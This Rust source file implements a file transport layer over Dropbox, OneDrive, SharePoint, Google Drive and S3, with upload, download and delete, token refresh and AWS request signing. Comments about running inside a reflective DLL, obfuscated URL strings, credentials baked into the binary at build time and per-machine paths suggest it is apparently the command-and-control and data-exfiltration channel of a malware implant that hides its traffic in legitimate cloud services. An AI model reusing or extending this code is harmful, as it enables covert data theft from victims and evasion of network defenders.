//! Transport abstraction + provider implementations
//! (Dropbox, OneDrive, SharePoint, Google Drive, S3).
//!
//! To add a new provider:
//!   1. Implement `Transport` for your struct in this file
//!   2. Emit `cargo:rustc-cfg=stratum_provider_<name>` from build.rs
//!   3. Add a `#[cfg(stratum_provider_<name>)]` branch in `new_transport()`
//!   4. Bake provider credentials via STRATUM_* env vars in build.rs

use crate::s;
use serde_json::json;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use ureq::Agent;

type UreqResponse = ureq::http::Response<ureq::Body>;

// ── public trait ─────────────────────────────────────────────────────────────

pub trait Transport: Send + Sync {
    fn upload(&self, path: &str, data: &[u8]) -> bool;
    fn download(&self, path: &str) -> Option<Vec<u8>>;
    fn delete(&self, path: &str) -> bool;
}

pub type SharedTransport = Arc<dyn Transport>;

// ── shared helpers ────────────────────────────────────────────────────────────

struct TokenCache {
    token:   String,
    expires: Instant,
}

fn http_client() -> Agent {
    #[cfg(all(windows, stratum_debug))]
    macro_rules! wlog {
        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!($s, "\0").as_ptr()); } }
    }
    #[cfg(not(all(windows, stratum_debug)))]
    macro_rules! wlog { ($s:literal) => {} }

    wlog!("[tr] 1: Agent::config_builder()");
    let agent: Agent = Agent::config_builder()
        // No timeout_global: with a global timeout ureq spawns a thread for DNS
        // resolution (resolve_async) which corrupts heap in reflective-DLL context.
        // Per-connection timeouts are set via timeout_connect + timeout_send_request
        // + timeout_recv_response to avoid blocking forever without spawning threads.
        .timeout_connect(Some(Duration::from_secs(30)))
        .timeout_send_request(Some(Duration::from_secs(30)))
        .timeout_recv_response(Some(Duration::from_secs(30)))
        .user_agent(env!("STRATUM_UA"))
        .build()
        .into();
    wlog!("[tr] 6: done");
    agent
}

#[cfg(all(windows, stratum_debug))]
macro_rules! tlog {
    ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[TX] ", $s, "\0").as_ptr()); } }
}
#[cfg(all(not(windows), stratum_debug))]
macro_rules! tlog { ($s:literal) => { eprintln!("[TX] {}", $s); } }
#[cfg(not(stratum_debug))]
macro_rules! tlog { ($s:literal) => {}; }

/// Percent-encode a string for application/x-www-form-urlencoded.
fn pct_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
            | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => { out.push('%'); out.push_str(&format!("{:02X}", b)); }
        }
    }
    out
}

fn form_encode(pairs: &[(&str, &str)]) -> String {
    pairs.iter()
        .map(|(k, v)| format!("{}={}", pct_encode(k), pct_encode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

fn ok_status(resp: &UreqResponse) -> bool {
    let s = resp.status().as_u16();
    (200..300).contains(&s)
}

fn read_body(mut resp: UreqResponse) -> Option<Vec<u8>> {
    resp.body_mut().read_to_vec().ok()
}

// ── Dropbox ───────────────────────────────────────────────────────────────────

fn dbx_token_url()    -> String { s!("https://api.dropboxapi.com/oauth2/token") }
fn dbx_upload_url()   -> String { s!("https://content.dropboxapi.com/2/files/upload") }
fn dbx_download_url() -> String { s!("https://content.dropboxapi.com/2/files/download") }
fn dbx_delete_url()   -> String { s!("https://api.dropboxapi.com/2/files/delete_v2") }

pub struct DropboxTransport {
    client:        Agent,
    app_key:       String,
    app_secret:    String,
    refresh_token: String,
    cache:         Mutex<Option<TokenCache>>,
}

impl DropboxTransport {
    pub fn new(app_key: &str, app_secret: &str, refresh_token: &str) -> Self {
        Self {
            client:        http_client(),
            app_key:       app_key.to_string(),
            app_secret:    app_secret.to_string(),
            refresh_token: refresh_token.to_string(),
            cache:         Mutex::new(None),
        }
    }

    fn access_token(&self) -> Option<String> {
        tlog!("dbx: access_token enter");
        {
            let guard = self.cache.lock().ok()?;
            if let Some(ref c) = *guard {
                if c.expires > Instant::now() {
                    tlog!("dbx: token from cache");
                    return Some(c.token.clone());
                }
            }
        }
        tlog!("dbx: building form");
        let form = form_encode(&[
            ("grant_type",    "refresh_token"),
            ("refresh_token", self.refresh_token.as_str()),
            ("client_id",     self.app_key.as_str()),
            ("client_secret", self.app_secret.as_str()),
        ]);
        tlog!("dbx: sending token request");
        let resp = self.client.post(&dbx_token_url())
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send(form.as_bytes())
            .ok()?;
        tlog!("dbx: token resp received, reading body");
        let bytes = read_body(resp)?;
        tlog!("dbx: parsing json");
        let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
        let tok = body["access_token"].as_str()?.to_string();
        let ttl = body["expires_in"].as_u64().unwrap_or(14400);
        tlog!("dbx: storing token");
        let mut guard = self.cache.lock().ok()?;
        *guard = Some(TokenCache {
            token:   tok.clone(),
            expires: Instant::now() + Duration::from_secs(ttl.saturating_sub(60)),
        });
        tlog!("dbx: token ok");
        Some(tok)
    }
}

impl Transport for DropboxTransport {
    fn upload(&self, path: &str, data: &[u8]) -> bool {
        tlog!("dbx: upload enter");
        let tok = match self.access_token() { Some(t) => t, None => { tlog!("dbx: upload no token"); return false; } };
        tlog!("dbx: upload got token, building request");
        let arg = json!({"path": path, "mode": "overwrite", "autorename": false});
        tlog!("dbx: upload sending (pre-send)");
        let send_result = self.client.post(&dbx_upload_url())
            .header("Authorization",   &format!("Bearer {}", tok))
            .header("Dropbox-API-Arg", &arg.to_string())
            .header("Content-Type",    "application/octet-stream")
            .send(data.to_vec());
        tlog!("dbx: upload send returned");
        let result = match send_result {
            Ok(ref r) => {
                let s = r.status().as_u16();
                tlog!("dbx: upload ok_status check");
                (200..300).contains(&s)
            }
            Err(_) => {
                tlog!("dbx: upload send error");
                false
            }
        };
        tlog!("dbx: upload done");
        result
    }

    fn download(&self, path: &str) -> Option<Vec<u8>> {
        let tok = self.access_token()?;
        let arg = json!({"path": path});
        let resp = self.client.post(&dbx_download_url())
            .header("Authorization",   &format!("Bearer {}", tok))
            .header("Dropbox-API-Arg", &arg.to_string())
            .send_empty().ok()?;
        if ok_status(&resp) { read_body(resp) } else { None }
    }

    fn delete(&self, path: &str) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let body = json!({"path": path}).to_string();
        self.client.post(&dbx_delete_url())
            .header("Authorization", &format!("Bearer {}", tok))
            .header("Content-Type",  "application/json")
            .send(body.as_bytes())
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }
}

// ── OneDrive / Microsoft Graph ────────────────────────────────────────────────

fn od_token_url()  -> String { s!("https://login.microsoftonline.com/consumers/oauth2/v2.0/token") }
fn od_graph_base() -> String { s!("https://graph.microsoft.com/v1.0/me/drive/root:") }
fn od_scope()      -> String { s!("Files.ReadWrite.All offline_access") }

pub struct OneDriveTransport {
    client:        Agent,
    client_id:     String,
    client_secret: String,
    tenant_id:     String,
    refresh_token: String,
    cache:         Mutex<Option<TokenCache>>,
}

impl OneDriveTransport {
    pub fn new(client_id: &str, client_secret: &str, tenant_id: &str, refresh_token: &str) -> Self {
        Self {
            client:        http_client(),
            client_id:     client_id.to_string(),
            client_secret: client_secret.to_string(),
            tenant_id:     tenant_id.to_string(),
            refresh_token: refresh_token.to_string(),
            cache:         Mutex::new(None),
        }
    }

    fn access_token(&self) -> Option<String> {
        {
            let guard = self.cache.lock().ok()?;
            if let Some(ref c) = *guard {
                if c.expires > Instant::now() { return Some(c.token.clone()); }
            }
        }
        let token_url = format!(
            "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
            self.tenant_id
        );
        let scope = od_scope();
        let form = form_encode(&[
            ("grant_type",    "refresh_token"),
            ("refresh_token", self.refresh_token.as_str()),
            ("client_id",     self.client_id.as_str()),
            ("client_secret", self.client_secret.as_str()),
            ("scope",         scope.as_str()),
        ]);
        let resp = self.client.post(&token_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send(form.as_bytes())
            .ok()?;
        let bytes = read_body(resp)?;
        let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
        let tok = body["access_token"].as_str()?.to_string();
        let ttl = body["expires_in"].as_u64().unwrap_or(3600);
        let mut guard = self.cache.lock().ok()?;
        *guard = Some(TokenCache {
            token:   tok.clone(),
            expires: Instant::now() + Duration::from_secs(ttl.saturating_sub(60)),
        });
        Some(tok)
    }

    fn url(&self, path: &str, suffix: &str) -> String {
        format!("{}{}{}", od_graph_base(), path, suffix)
    }

    fn ensure_folder(&self, tok: &str, path: &str) {
        // Walk each folder component and create it if missing.
        // POST /children with conflictBehavior=ignore is idempotent.
        let parts: Vec<&str> = path.trim_start_matches('/')
            .split('/')
            .filter(|s| !s.is_empty())
            .collect();
        let mut current = String::new();
        for part in &parts {
            let parent_url = if current.is_empty() {
                s!("https://graph.microsoft.com/v1.0/me/drive/root/children")
            } else {
                format!("https://graph.microsoft.com/v1.0/me/drive/root:/{}/children", current)
            };
            if !current.is_empty() { current.push('/'); }
            current.push_str(part);
            let body = format!(
                r#"{{"name":"{}","folder":{{}},"@microsoft.graph.conflictBehavior":"ignore"}}"#,
                part
            );
            let _ = self.client.post(&parent_url)
                .header("Authorization", &format!("Bearer {}", tok))
                .header("Content-Type",  "application/json")
                .send(body.as_bytes());
        }
    }
}

impl Transport for OneDriveTransport {
    fn upload(&self, path: &str, data: &[u8]) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        // Ensure parent folder exists (Graph returns 404 if folder is missing)
        let folder: String = path.trim_start_matches('/')
            .split('/')
            .collect::<Vec<_>>()
            .iter()
            .rev()
            .skip(1)
            .rev()
            .cloned()
            .collect::<Vec<_>>()
            .join("/");
        if !folder.is_empty() {
            self.ensure_folder(&tok, &folder);
        }
        let url = self.url(path, ":/content");
        self.client.put(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .header("Content-Type",  "application/octet-stream")
            .send(data.to_vec())
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }

    fn download(&self, path: &str) -> Option<Vec<u8>> {
        let tok = self.access_token()?;
        let url = self.url(path, ":/content");
        let resp = self.client.get(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call().ok()?;
        if ok_status(&resp) { read_body(resp) } else { None }
    }

    fn delete(&self, path: &str) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let url = self.url(path, ":");
        self.client.delete(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call()
            .map(|r| { let s = r.status().as_u16(); (200..300).contains(&s) || s == 404 })
            .unwrap_or(false)
    }
}

// ── AWS S3 (Sig V4) ───────────────────────────────────────────────────────────

fn s3_empty_hash() -> String {
    s!("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
}

pub struct S3Transport {
    client:     Agent,
    access_key: String,
    secret_key: String,
    region:     String,
    host:       String,
    endpoint:   String,
}

impl S3Transport {
    pub fn new(access_key: &str, secret_key: &str, region: &str, bucket: &str) -> Self {
        let host     = format!("{}.s3.{}.amazonaws.com", bucket, region);
        let endpoint = format!("https://{}", host);
        Self {
            client:     http_client(),
            access_key: access_key.to_string(),
            secret_key: secret_key.to_string(),
            region:     region.to_string(),
            host,
            endpoint,
        }
    }

    fn signing_key(&self, date: &str) -> [u8; 32] {
        let k_date    = hmac_sha256(format!("AWS4{}", self.secret_key).as_bytes(), date.as_bytes());
        let k_region  = hmac_sha256(&k_date, self.region.as_bytes());
        let k_service = hmac_sha256(&k_region, b"s3");
        hmac_sha256(&k_service, b"aws4_request")
    }

    fn sign(&self, method: &str, key: &str, body: &[u8], content_type: Option<&str>)
        -> (String, String, String)
    {
        let now      = chrono::Utc::now();
        let dt       = now.format("%Y%m%dT%H%M%SZ").to_string();
        let date     = now.format("%Y%m%d").to_string();
        let phash    = sha256_hex(body);
        let scope    = format!("{}/{}/s3/aws4_request", date, self.region);

        let (signed_hdrs, canon_hdrs) = if let Some(ct) = content_type {
            let sh = "content-type;host;x-amz-content-sha256;x-amz-date";
            let ch = format!(
                "content-type:{}\nhost:{}\nx-amz-content-sha256:{}\nx-amz-date:{}\n",
                ct, self.host, phash, dt
            );
            (sh.to_string(), ch)
        } else {
            let sh = "host;x-amz-content-sha256;x-amz-date";
            let ch = format!(
                "host:{}\nx-amz-content-sha256:{}\nx-amz-date:{}\n",
                self.host, phash, dt
            );
            (sh.to_string(), ch)
        };

        let canon_req = format!(
            "{}\n/{}\n\n{}\n{}\n{}",
            method, key, canon_hdrs, signed_hdrs, phash
        );
        let sts = format!(
            "AWS4-HMAC-SHA256\n{}\n{}\n{}",
            dt, scope, sha256_hex(canon_req.as_bytes())
        );

        let sig  = hex::encode(hmac_sha256(&self.signing_key(&date), sts.as_bytes()));
        let auth = format!(
            "AWS4-HMAC-SHA256 Credential={}/{}, SignedHeaders={}, Signature={}",
            self.access_key, scope, signed_hdrs, sig
        );
        (auth, dt, phash)
    }
}

impl Transport for S3Transport {
    fn upload(&self, path: &str, data: &[u8]) -> bool {
        let key = path.trim_start_matches('/');
        let (auth, amz_date, phash) = self.sign("PUT", key, data, Some("application/octet-stream"));
        self.client.put(&format!("{}/{}", self.endpoint, key))
            .header("Authorization",        &auth)
            .header("X-Amz-Date",           &amz_date)
            .header("X-Amz-Content-Sha256", &phash)
            .header("Content-Type",         "application/octet-stream")
            .send(data.to_vec())
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }

    fn download(&self, path: &str) -> Option<Vec<u8>> {
        let key = path.trim_start_matches('/');
        let (auth, amz_date, _) = self.sign("GET", key, b"", None);
        let empty_hash = s3_empty_hash();
        let resp = self.client.get(&format!("{}/{}", self.endpoint, key))
            .header("Authorization",        &auth)
            .header("X-Amz-Date",           &amz_date)
            .header("X-Amz-Content-Sha256", &empty_hash)
            .call().ok()?;
        if ok_status(&resp) { read_body(resp) } else { None }
    }

    fn delete(&self, path: &str) -> bool {
        let key = path.trim_start_matches('/');
        let (auth, amz_date, _) = self.sign("DELETE", key, b"", None);
        let empty_hash = s3_empty_hash();
        self.client.delete(&format!("{}/{}", self.endpoint, key))
            .header("Authorization",        &auth)
            .header("X-Amz-Date",           &amz_date)
            .header("X-Amz-Content-Sha256", &empty_hash)
            .call()
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }
}

// ── SharePoint / Microsoft Graph ──────────────────────────────────────────────

fn sp_token_base() -> String { s!("https://login.microsoftonline.com/") }
fn sp_graph_base() -> String { s!("https://graph.microsoft.com/v1.0/sites/") }
fn sp_scope()      -> String { s!("Sites.ReadWrite.All offline_access") }

pub struct SharePointTransport {
    client:        Agent,
    client_id:     String,
    client_secret: String,
    tenant_id:     String,
    refresh_token: String,
    site_id:       String,
    cache:         Mutex<Option<TokenCache>>,
}

impl SharePointTransport {
    pub fn new(client_id: &str, client_secret: &str, tenant_id: &str,
               refresh_token: &str, site_id: &str) -> Self {
        Self {
            client:        http_client(),
            client_id:     client_id.to_string(),
            client_secret: client_secret.to_string(),
            tenant_id:     tenant_id.to_string(),
            refresh_token: refresh_token.to_string(),
            site_id:       site_id.to_string(),
            cache:         Mutex::new(None),
        }
    }

    fn access_token(&self) -> Option<String> {
        {
            let guard = self.cache.lock().ok()?;
            if let Some(ref c) = *guard {
                if c.expires > Instant::now() { return Some(c.token.clone()); }
            }
        }
        let url   = format!("{}{}/oauth2/v2.0/token", sp_token_base(), self.tenant_id);
        let scope = sp_scope();
        let form = form_encode(&[
            ("grant_type",    "refresh_token"),
            ("refresh_token", self.refresh_token.as_str()),
            ("client_id",     self.client_id.as_str()),
            ("client_secret", self.client_secret.as_str()),
            ("scope",         scope.as_str()),
        ]);
        let resp = self.client.post(&url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send(form.as_bytes())
            .ok()?;
        let bytes = read_body(resp)?;
        let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
        let tok = body["access_token"].as_str()?.to_string();
        let ttl = body["expires_in"].as_u64().unwrap_or(3600);
        let mut guard = self.cache.lock().ok()?;
        *guard = Some(TokenCache {
            token:   tok.clone(),
            expires: Instant::now() + Duration::from_secs(ttl.saturating_sub(60)),
        });
        Some(tok)
    }

    fn url(&self, path: &str, suffix: &str) -> String {
        format!("{}{}/drive/root:{}{}", sp_graph_base(), self.site_id, path, suffix)
    }
}

impl Transport for SharePointTransport {
    fn upload(&self, path: &str, data: &[u8]) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let url = self.url(path, ":/content");
        self.client.put(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .header("Content-Type",  "application/octet-stream")
            .send(data.to_vec())
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }

    fn download(&self, path: &str) -> Option<Vec<u8>> {
        let tok = self.access_token()?;
        let url = self.url(path, ":/content");
        let resp = self.client.get(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call().ok()?;
        if ok_status(&resp) { read_body(resp) } else { None }
    }

    fn delete(&self, path: &str) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let url = self.url(path, ":");
        self.client.delete(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call()
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }
}

// ── Google Drive API v3 ───────────────────────────────────────────────────────

fn gd_token_url()  -> String { s!("https://oauth2.googleapis.com/token") }
fn gd_files_url()  -> String { s!("https://www.googleapis.com/drive/v3/files") }
fn gd_upload_url() -> String { s!("https://www.googleapis.com/upload/drive/v3/files") }

pub struct GoogleDriveTransport {
    client:        Agent,
    client_id:     String,
    client_secret: String,
    refresh_token: String,
    folder_id:     String,
    cache:         Mutex<Option<TokenCache>>,
}

impl GoogleDriveTransport {
    pub fn new(client_id: &str, client_secret: &str,
               refresh_token: &str, folder_id: &str) -> Self {
        Self {
            client:        http_client(),
            client_id:     client_id.to_string(),
            client_secret: client_secret.to_string(),
            refresh_token: refresh_token.to_string(),
            folder_id:     folder_id.to_string(),
            cache:         Mutex::new(None),
        }
    }

    fn access_token(&self) -> Option<String> {
        {
            let guard = self.cache.lock().ok()?;
            if let Some(ref c) = *guard {
                if c.expires > Instant::now() { return Some(c.token.clone()); }
            }
        }
        let form = form_encode(&[
            ("grant_type",    "refresh_token"),
            ("refresh_token", self.refresh_token.as_str()),
            ("client_id",     self.client_id.as_str()),
            ("client_secret", self.client_secret.as_str()),
        ]);
        let resp = self.client.post(&gd_token_url())
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send(form.as_bytes())
            .ok()?;
        let bytes = read_body(resp)?;
        let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
        let tok = body["access_token"].as_str()?.to_string();
        let ttl = body["expires_in"].as_u64().unwrap_or(3600);
        let mut guard = self.cache.lock().ok()?;
        *guard = Some(TokenCache {
            token:   tok.clone(),
            expires: Instant::now() + Duration::from_secs(ttl.saturating_sub(60)),
        });
        Some(tok)
    }

    // Walk (or create) the folder hierarchy under self.folder_id and return
    // the Drive folder ID that corresponds to the last component of `parts`.
    fn resolve_folder(&self, token: &str, parts: &[&str]) -> Option<String> {
        let mut parent = self.folder_id.clone();
        for &name in parts {
            let q = format!(
                "name='{}' and '{}' in parents and mimeType='application/vnd.google-apps.folder' and trashed=false",
                name, parent
            );
            let url = format!("{}?q={}&fields=files(id)", gd_files_url(), pct_encode(&q));
            let resp = self.client.get(&url)
                .header("Authorization", &format!("Bearer {}", token))
                .call().ok()?;
            let bytes = read_body(resp)?;
            let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
            parent = if let Some(id) = body["files"][0]["id"].as_str() {
                id.to_string()
            } else {
                let meta = json!({
                    "name": name,
                    "mimeType": "application/vnd.google-apps.folder",
                    "parents": [parent]
                }).to_string();
                let cr = self.client.post(&gd_files_url())
                    .header("Authorization", &format!("Bearer {}", token))
                    .header("Content-Type",  "application/json")
                    .send(meta.as_bytes()).ok()?;
                let cb = read_body(cr)?;
                let cbj: serde_json::Value = serde_json::from_slice(&cb).ok()?;
                cbj["id"].as_str()?.to_string()
            };
        }
        Some(parent)
    }

    // Split "/Machine1/sub/.bk" → (["Machine1","sub"], ".bk").
    // Leading slash and empty segments are ignored.
    fn split_path(path: &str) -> (Vec<&str>, &str) {
        let parts: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
        if parts.is_empty() {
            return (vec![], "");
        }
        let filename = parts[parts.len() - 1];
        let dirs     = parts[..parts.len() - 1].to_vec();
        (dirs, filename)
    }

    fn file_id_in(&self, token: &str, filename: &str, parent_id: &str) -> Option<String> {
        let q = format!(
            "name='{}' and '{}' in parents and trashed=false",
            filename, parent_id
        );
        let url = format!("{}?q={}&fields=files(id)", gd_files_url(), pct_encode(&q));
        let resp = self.client.get(&url)
            .header("Authorization", &format!("Bearer {}", token))
            .call().ok()?;
        let bytes = read_body(resp)?;
        let body: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
        body["files"][0]["id"].as_str().map(|s| s.to_string())
    }
}

impl Transport for GoogleDriveTransport {
    fn upload(&self, path: &str, data: &[u8]) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let (dirs, filename) = Self::split_path(path);
        let parent_id = match self.resolve_folder(&tok, &dirs) {
            Some(id) => id,
            None     => return false,
        };
        if let Some(fid) = self.file_id_in(&tok, filename, &parent_id) {
            let url = format!("{}/{}?uploadType=media", gd_upload_url(), fid);
            self.client.patch(&url)
                .header("Authorization", &format!("Bearer {}", tok))
                .header("Content-Type", "application/octet-stream")
                .send(data.to_vec())
                .map(|r| ok_status(&r))
                .unwrap_or(false)
        } else {
            use rand::RngCore;
            let mut b = [0u8; 8];
            rand::thread_rng().fill_bytes(&mut b);
            let boundary = format!("b{}", hex::encode(b));
            let meta     = json!({"name": filename, "parents": [parent_id]}).to_string();
            let body_str = format!(
                "--{b}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n{meta}\r\n\
                 --{b}\r\nContent-Type: application/octet-stream\r\n\r\n",
                b = boundary, meta = meta
            );
            let mut payload = body_str.into_bytes();
            payload.extend_from_slice(data);
            payload.extend_from_slice(format!("\r\n--{}--", boundary).as_bytes());
            let url = format!("{}?uploadType=multipart", gd_upload_url());
            self.client.post(&url)
                .header("Authorization", &format!("Bearer {}", tok))
                .header("Content-Type", &format!("multipart/related; boundary={}", boundary))
                .send(payload)
                .map(|r| ok_status(&r))
                .unwrap_or(false)
        }
    }

    fn download(&self, path: &str) -> Option<Vec<u8>> {
        let tok = self.access_token()?;
        let (dirs, filename) = Self::split_path(path);
        let parent_id = self.resolve_folder(&tok, &dirs)?;
        let fid       = self.file_id_in(&tok, filename, &parent_id)?;
        let url = format!("{}/{}?alt=media", gd_files_url(), fid);
        let resp = self.client.get(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call().ok()?;
        if ok_status(&resp) { read_body(resp) } else { None }
    }

    fn delete(&self, path: &str) -> bool {
        let tok = match self.access_token() { Some(t) => t, None => return false };
        let (dirs, filename) = Self::split_path(path);
        let parent_id = match self.resolve_folder(&tok, &dirs) {
            Some(id) => id,
            None     => return true,
        };
        let fid = match self.file_id_in(&tok, filename, &parent_id) {
            Some(id) => id,
            None     => return true,
        };
        let url = format!("{}/{}", gd_files_url(), fid);
        self.client.delete(&url)
            .header("Authorization", &format!("Bearer {}", tok))
            .call()
            .map(|r| ok_status(&r))
            .unwrap_or(false)
    }
}

// ── Sig V4 crypto helpers ─────────────────────────────────────────────────────

fn sha256_hex(data: &[u8]) -> String {
    use sha2::Digest;
    hex::encode(sha2::Sha256::new().chain_update(data).finalize())
}

fn hmac_sha256(key: &[u8], msg: &[u8]) -> [u8; 32] {
    use sha2::Digest;
    const B: usize = 64;
    let mut k: Vec<u8> = if key.len() > B {
        sha2::Sha256::new().chain_update(key).finalize().to_vec()
    } else {
        key.to_vec()
    };
    k.resize(B, 0);
    let ipad: Vec<u8> = k.iter().map(|&b| b ^ 0x36).collect();
    let opad: Vec<u8> = k.iter().map(|&b| b ^ 0x5c).collect();
    let inner = sha2::Sha256::new().chain_update(&ipad).chain_update(msg).finalize();
    sha2::Sha256::new().chain_update(&opad).chain_update(&inner).finalize().into()
}

// ── factory ───────────────────────────────────────────────────────────────────

/// Construct the provider transport selected at compile time via STRATUM_PROVIDER.
///
/// s3:          stratum_provider_s3          — STRATUM_ACCESS_KEY_ID / SECRET / S3_REGION / S3_BUCKET
/// onedrive:    stratum_provider_onedrive    — STRATUM_APP_KEY / APP_SECRET / TENANT_ID / REFRESH_TOKEN
/// sharepoint:  stratum_provider_sharepoint  — STRATUM_APP_KEY / APP_SECRET / TENANT_ID / REFRESH_TOKEN / SITE_ID
/// googledrive: stratum_provider_googledrive — STRATUM_APP_KEY / APP_SECRET / REFRESH_TOKEN / FOLDER_ID
/// dropbox:     default                      — STRATUM_APP_KEY / APP_SECRET / REFRESH_TOKEN
pub fn new_transport() -> SharedTransport {
    #[cfg(stratum_provider_s3)]
    {
        return Arc::new(S3Transport::new(
            env!("STRATUM_ACCESS_KEY_ID"),
            env!("STRATUM_SECRET_ACCESS_KEY"),
            env!("STRATUM_S3_REGION"),
            env!("STRATUM_S3_BUCKET"),
        ));
    }

    #[cfg(stratum_provider_onedrive)]
    {
        return Arc::new(OneDriveTransport::new(
            env!("STRATUM_APP_KEY"),
            env!("STRATUM_APP_SECRET"),
            env!("STRATUM_TENANT_ID"),
            env!("STRATUM_REFRESH_TOKEN"),
        ));
    }

    #[cfg(stratum_provider_sharepoint)]
    {
        return Arc::new(SharePointTransport::new(
            env!("STRATUM_APP_KEY"),
            env!("STRATUM_APP_SECRET"),
            env!("STRATUM_TENANT_ID"),
            env!("STRATUM_REFRESH_TOKEN"),
            env!("STRATUM_SITE_ID"),
        ));
    }

    #[cfg(stratum_provider_googledrive)]
    {
        return Arc::new(GoogleDriveTransport::new(
            env!("STRATUM_APP_KEY"),
            env!("STRATUM_APP_SECRET"),
            env!("STRATUM_REFRESH_TOKEN"),
            env!("STRATUM_FOLDER_ID"),
        ));
    }

    #[cfg(not(any(stratum_provider_s3, stratum_provider_onedrive,
                  stratum_provider_sharepoint, stratum_provider_googledrive)))]
    Arc::new(DropboxTransport::new(
        env!("STRATUM_APP_KEY"),
        env!("STRATUM_APP_SECRET"),
        env!("STRATUM_REFRESH_TOKEN"),
    ))
}
